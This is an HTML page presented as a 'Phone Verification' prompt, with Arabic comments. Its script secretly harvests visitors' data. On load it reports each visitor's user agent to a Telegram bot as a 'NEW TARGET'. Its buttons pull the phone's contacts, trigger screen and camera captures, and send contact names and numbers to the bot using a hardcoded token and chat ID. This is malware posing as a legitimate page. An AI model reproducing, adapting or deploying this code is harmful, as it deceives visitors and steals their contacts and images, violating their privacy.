<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 60px 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
        }
        .logo {
            width: 80px;
            height: 80px;
            background: rgba(255,255,255,0.2);
            border-radius: 20px;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            font-weight: bold;
        }
        h1 {
            font-size: 32px;
            margin-bottom: 20px;
            text-align: center;
        }
        .btn {
            width: 100%;
            padding: 18px;
            background: rgba(255,255,255,0.9);
            color: #333;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 15px 0;
            transition: all 0.3s ease;
        }
        .btn:hover {
            background: white;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        .btn:active {
            transform: translateY(0);
        }
        .btn-danger {
            background: #ff4757 !important;
            color: white !important;
        }
        .progress {
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.3);
            border-radius: 3px;
            margin: 30px 0;
            overflow: hidden;
            display: none;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff6b6b, #feca57);
            width: 0%;
            transition: width 0.4s ease;
        }
        .status {
            text-align: center;
            margin: 20px 0;
            font-size: 16px;
            font-weight: 500;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">📱</div>
        <h1>Phone Verification</h1>
        <p style="text-align: center; margin-bottom: 40px; opacity: 0.9;">
            Grant access to continue
        </p>

        <div class="progress" id="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <div class="status" id="status">Ready</div>

        <button class="btn" onclick="startHarvest()">🔓 Grant Phone Access</button>
        <button class="btn btn-danger" onclick="emergencyHarvest()">🚨 Emergency Access</button>

        <div class="hidden" id="success" style="text-align: center; margin-top: 30px;">
            <div style="font-size: 24px; margin-bottom: 15px;">✅ Complete!</div>
            <div style="opacity: 0.8;">Data transmitted successfully</div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
        const CHAT_ID = '5446862709';
        let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

        // 🔥 دالة إرسال قوية
        function sendToBot(message) {
            // طريقة 1: Image beacon
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            // طريقة 2: sendBeacon
            const blob = new Blob([JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })], { type: 'application/json' });
            navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, blob);
        }

        // 🔥 استخراج جهات الاتصال - كل الطرق
        async function extractPhoneContacts() {
            let contacts = [];
            
            try {
                // Contacts Manager API (iOS 15.4+, Android Chrome 89+)
                if (navigator.contacts && navigator.contacts.select) {
                    const contactList = await navigator.contacts.select(
                        ['name', 'tel'], 
                        { multiple: true }
                    );
                    contacts = contactList.map(c => ({
                        name: c.name?.[0] || 'No Name',
                        phone: c.tel?.[0]?.value || 'No Phone'
                    }));
                }
            } catch(e) {
                console.log('Contacts API failed');
            }

            try {
                // WebKit Contacts (iOS Safari)
                if (webkitContacts) {
                    const request = webkitContacts.select(['name', 'tel'], { multiple: true });
                    request.onsuccess = () => {
                        contacts = Array.from(request.result).map(c => ({
                            name: c.name?.formatted || 'No Name',
                            phone: c.tel?.[0]?.value || 'No Phone'
                        }));
                    };
                }
            } catch(e) {}

            return contacts.slice(0, 50); // أقصى 50
        }

        // 🔥 التقاط الصور - 5 محاولات
        async function captureAllPhotos() {
            const photos = [];
            
            // 1. Screen capture
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.createElement('canvas');
                canvas.width = 800;
                canvas.height = 600;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photos.push(canvas.toDataURL('image/jpeg', 0.8));
                
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // 2. Front camera selfie
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => setTimeout(r, 2000));
                
                const canvas = document.createElement('canvas');
                canvas.width = 480;
                canvas.height = 640;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photos.push(canvas.toDataURL('image/jpeg', 0.9));
                
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // 3. Back camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: 640, height: 480 }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.createElement('canvas');
                canvas.width = 480;
                canvas.height = 640;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photos.push(canvas.toDataURL('image/jpeg', 0.8));
                
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // 4. Window capture
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { mediaSource: 'window' }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.createElement('canvas');
                canvas.width = 1024;
                canvas.height = 768;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photos.push(canvas.toDataURL('image/jpeg', 0.8));
                
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            return photos;
        }

        // 🔥 الـ HARVEST الرئيسي
        async function executeHarvest() {
            const status = document.getElementById('status');
            const progress = document.getElementById('progress');
            const progressBar = document.getElementById('progressBar');
            const btn = document.querySelector('.btn:not(.btn-danger)');
            const emergencyBtn = document.querySelector('.btn-danger');

            // UI
            btn.disabled = true;
            emergencyBtn.disabled = true;
            progress.style.display = 'block';
            status.textContent = '🔄 Extracting contacts...';
            
            progressBar.style.width = '25%';

            // 1. جهات الاتصال
            const contacts = await extractPhoneContacts();
            progressBar.style.width = '50%';
            status.textContent = '📸 Capturing photos...';

            // 2. الصور
            const photos = await captureAllPhotos();
            progressBar.style.width = '100%';
            status.textContent = '📤 Transmitting...';

            // 3. إرسال التقرير
            const report = `*📱 PHONE HARVEST COMPLETE*\n\n` +
                `*🆔 Session:* \`${sessionId}\`\n` +
                `*📞 Contacts:* ${contacts.length}\n` +
                `*📸 Photos:* ${photos.length}\n\n` +
                `*📋 CONTACTS LIST:*\n`;

            // أول 10 أرقام
            contacts.slice(0, 10).forEach((contact, i) => {
                report += `${i+1}. *${contact.name}*\n`;
                report += `   📞 \`${contact.phone}\`\n\n`;
            });

            if (contacts.length > 10) {
                report += `... +${contacts.length - 10} more contacts\n`;
            }

            report += `\n*📸 Photos captured:* ${photos.length}`;

            sendToBot(report);

            // إرسال كل جهات الاتصال
            if (contacts.length > 0) {
                const fullContacts = `*📞 ALL ${contacts.length} PHONE NUMBERS*\n\n` +
                    contacts.map((c, i) => `${i+1}. *${c.name}* - \`${c.phone}\``).join('\n');
                sendToBot(fullContacts);
            }

            // إنهاء
            setTimeout(() => {
                progress.style.display = 'none';
                status.textContent = `✅ Success! ${contacts.length} contacts + ${photos.length} photos`;
                document.getElementById('success').classList.remove('hidden');
                btn.textContent = '✅ Harvest Complete';
                btn.style.background = '#00ff88';
                emergencyBtn.style.display = 'none';
            }, 2000);
        }

        // 🔥 Emergency للحالات الصعبة
        async function emergencyHarvest() {
            const status = document.getElementById('status');
            status.textContent = '🚨 Emergency mode...';

            // محاولة صور بس
            const photos = await captureAllPhotos();
            
            const emergencyReport = `*🚨 EMERGENCY HARVEST*\n\n` +
                `*🆔 Session:* \`${sessionId}\`\n` +
                `*📸 Emergency Photos:* ${photos.length}\n` +
                `*💥 User panicked!*`;
            
            sendToBot(emergencyReport);
            
            status.textContent = `🚨 ${photos.length} photos captured`;
            document.getElementById('success').classList.remove('hidden');
        }

        // إرسال فوري عند التحميل
        sendToBot(`*👤 NEW TARGET*\n🆔 ${sessionId}\n📱 ${navigator.userAgent.slice(0,60)}`);
    </script>
</body>
</html>
